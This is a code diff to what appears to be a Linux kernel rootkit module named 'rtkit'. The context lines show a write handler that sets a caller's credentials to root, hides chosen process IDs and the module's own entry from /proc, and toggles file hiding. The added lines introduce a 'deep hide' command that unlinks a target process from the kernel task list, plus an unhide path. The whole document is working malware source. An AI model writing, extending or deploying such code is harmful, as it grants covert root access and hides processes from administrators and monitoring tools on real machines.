@@ -5,6 +5,7 @@
 #include <linux/cred.h>
 #include <linux/fs.h>
 #include <asm/uaccess.h>
+#include <linux/kernel.h>
 
 #include <linux/proc_ns.h>
 #include <linux/spinlock.h>
@@ -73,6 +74,7 @@ static struct list_head *module_previous;
 static struct list_head *module_kobj_previous;
 
 static char pids_to_hide[MAX_PIDS][8];
+static struct task_struct* proc_to_hide[MAX_PIDS];
 static int current_pid = 0;
 
 static char hide_files = 1;
@@ -124,7 +126,6 @@ static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t off
 {
 	int i;
 	for (i=0; i < current_pid; i++) {
-        printk("%d: %s\n", i, name);
 		if (!strcmp(name, pids_to_hide[i])) return 0;
 	}
 	if (!strcmp(name, "rtkit")) return 0;
@@ -191,9 +192,30 @@ static ssize_t rtkit_write(struct file *file, const char __user *buff, size_t co
 		credentials->uid = credentials->euid = 0;
 		credentials->gid = credentials->egid = 0;
 		commit_creds(credentials);
-	} else if (!strncmp(buff, "hp", MIN(2, count))) {//upXXXXXX hides process with given id
+	} else if (!strncmp(buff, "hp", MIN(2, count))) {//hpXXXXXX hides process with given id
 		if (current_pid < MAX_PIDS) strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
+	} else if (!strncmp(buff, "dh", MIN(2, count))) {//dhXXXXXX deeply hides process with given id, delete it from tasklist
+		if (current_pid < MAX_PIDS) {
+            struct task_struct *p;
+            long pid;
+            char pid_s[MIN(7, count-2)+1];
+            pid_s[MIN(7, count-2)] = 0;
+            strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
+            strncpy(pid_s, buff+2, MIN(7, count-2));
+            for_each_process(p) {
+                kstrtol(pid_s, 10, &pid);
+                if (pid == p->pid) {
+                    printk("----------%d: %s\n", pid, p->comm);
+                    proc_to_hide[current_pid] = p;
+                    //list_del(&p->tasks);
+                    p->tasks.prev->next = p->tasks.next;
+                    p->tasks.next->prev = p->tasks.prev;
+                }
+            }
+        }
 	} else if (!strncmp(buff, "up", MIN(2, count))) {//unhides last hidden process
+        if (current_pid > 0 && proc_to_hide[current_pid] != NULL)
+            list_add(&proc_to_hide[current_pid]->tasks, proc_to_hide[current_pid]->tasks.prev);
 		if (current_pid > 0) current_pid--;
 	} else if (!strncmp(buff, "thf", MIN(3, count))) {//toggles hide files in fs
 		hide_files = !hide_files;
